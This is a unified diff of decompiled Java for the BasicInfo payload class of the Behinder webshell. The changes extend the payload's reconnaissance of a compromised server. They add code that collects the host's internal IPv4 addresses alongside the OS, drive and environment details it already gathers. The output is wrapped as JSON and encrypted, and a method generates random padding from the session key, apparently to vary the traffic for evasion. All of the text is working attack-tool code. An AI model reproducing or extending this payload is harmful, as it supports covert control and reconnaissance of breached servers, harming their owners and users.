@@ -2,12 +2,16 @@ package net.rebeyond.behinder.payload.java;
 
 import java.io.File;
 import java.lang.reflect.Method;
+import java.net.Inet4Address;
+import java.net.InetAddress;
+import java.net.NetworkInterface;
+import java.util.Enumeration;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
 import java.util.Properties;
+import java.util.Random;
 import java.util.Set;
-import java.util.Map.Entry;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 
@@ -18,7 +22,7 @@ public class BasicInfo {
    private Object Session;
 
    public boolean equals(Object obj) {
-      String result = "";
+      HashMap result = new HashMap();
       boolean var22 = false;
 
       Object so;
@@ -42,7 +46,7 @@ public class BasicInfo {
             Iterator var7 = entrySet.iterator();
 
             while(var7.hasNext()) {
-               Entry entry = (Entry)var7.next();
+               Map.Entry entry = (Map.Entry)var7.next();
                basicInfo.append(entry.getKey() + " = " + entry.getValue() + "<br/>");
             }
 
@@ -64,7 +68,9 @@ public class BasicInfo {
             entity.put("driveList", driveList);
             entity.put("osInfo", osInfo);
             entity.put("arch", System.getProperty("os.arch"));
-            result = this.buildJson(entity, true);
+            entity.put("localIp", this.getInnerIp());
+            result.put("status", "success");
+            result.put("msg", this.buildJson(entity, true));
             var22 = false;
             break label132;
          } catch (Exception var26) {
@@ -74,7 +80,7 @@ public class BasicInfo {
                try {
                   so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                   write = so.getClass().getMethod("write", byte[].class);
-                  write.invoke(so, this.Encrypt(result.getBytes("UTF-8")));
+                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                   so.getClass().getMethod("flush").invoke(so);
                   so.getClass().getMethod("close").invoke(so);
                } catch (Exception var23) {
@@ -86,7 +92,7 @@ public class BasicInfo {
          try {
             so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
             write = so.getClass().getMethod("write", byte[].class);
-            write.invoke(so, this.Encrypt(result.getBytes("UTF-8")));
+            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
             so.getClass().getMethod("flush").invoke(so);
             so.getClass().getMethod("close").invoke(so);
          } catch (Exception var24) {
@@ -98,13 +104,38 @@ public class BasicInfo {
       try {
          so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
          write = so.getClass().getMethod("write", byte[].class);
-         write.invoke(so, this.Encrypt(result.getBytes("UTF-8")));
+         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
          so.getClass().getMethod("flush").invoke(so);
          so.getClass().getMethod("close").invoke(so);
       } catch (Exception var25) {
       }
 
       return true;
+   }
+
+   private String getInnerIp() {
+      String ips = "";
+
+      try {
+         Enumeration netInterfaces = NetworkInterface.getNetworkInterfaces();
+         InetAddress ip = null;
+
+         while(netInterfaces.hasMoreElements()) {
+            NetworkInterface netInterface = (NetworkInterface)netInterfaces.nextElement();
+            Enumeration addresses = netInterface.getInetAddresses();
+
+            while(addresses.hasMoreElements()) {
+               ip = (InetAddress)addresses.nextElement();
+               if (ip != null && ip instanceof Inet4Address) {
+                  ips = ips + ip.getHostAddress() + " ";
+               }
+            }
+         }
+      } catch (Exception var6) {
+      }
+
+      ips = ips.replace("127.0.0.1", "").trim();
+      return ips;
    }
 
    private byte[] Encrypt(byte[] bs) throws Exception {
@@ -166,5 +197,18 @@ public class BasicInfo {
       }
 
       this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+   }
+
+   private byte[] getMagic() throws Exception {
+      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
+      Random random = new Random();
+      byte[] buf = new byte[magicNum];
+
+      for(int i = 0; i < buf.length; ++i) {
+         buf[i] = (byte)random.nextInt(256);
+      }
+
+      return buf;
    }
 }
